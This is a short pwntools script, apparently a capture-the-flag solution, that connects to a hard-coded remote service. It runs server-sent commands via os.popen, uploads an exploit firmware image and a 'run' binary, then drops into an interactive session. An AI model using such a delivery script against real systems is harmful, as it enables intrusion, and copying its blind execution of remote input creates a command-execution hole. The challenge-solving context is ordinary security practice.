from pwn import *

r = remote("52.197.161.60", 3154)
r.recvline()
res = os.popen(r.recvline().strip()).read()
r.send(res)

firmware = open("exploit_firmware", "rb").read()

print(r.recvline())
r.sendline("y")
print(r.recvline())
r.sendline(str(len(firmware)))
print(r.recvline())
r.send(firmware)

run = open("rootfs/home/chaos/run", "rb").read()

print(r.recvline())
r.sendline("y")
print(r.recvline())
r.sendline(str(len(run)))
print(r.recvline())
r.send(run)

context.log_level = 'debug'

r.interactive()